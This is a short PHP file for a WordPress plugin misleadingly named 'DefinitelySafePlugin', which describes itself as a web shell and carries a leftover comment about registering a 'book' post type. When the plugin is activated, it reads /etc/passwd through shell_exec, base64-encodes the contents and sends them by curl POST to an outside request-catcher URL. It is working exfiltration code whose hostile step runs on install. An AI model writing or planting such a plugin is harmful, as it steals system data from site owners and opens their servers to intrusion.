<?php
/*
Plugin Name: DefinitelySafePlugin
Description: A web shell plugin.
Version: 1.0
Author: Arian
*/

/**
 * Register the "book" custom post type
 */
function webShell() {
	//my webshell script to read files goes here
    $exfilData = shell_exec('cat /etc/passwd | base64');
    $url = "https://arian.requestcatcher.com/test";
    
    //setup curl
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $exfilData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Optional: timeout after 10 seconds

    $response = curl_exec($ch);

    if ($response === false) {
        error_log("webShell failed to send request: " . curl_error($ch));
    } else {
        error_log("webShell request sent successfully.");
    }

    curl_close($ch);


} 
//add_action( 'init', 'webShell' ); --> runs on every page


register_activation_hook( __FILE__, 'webShell' );
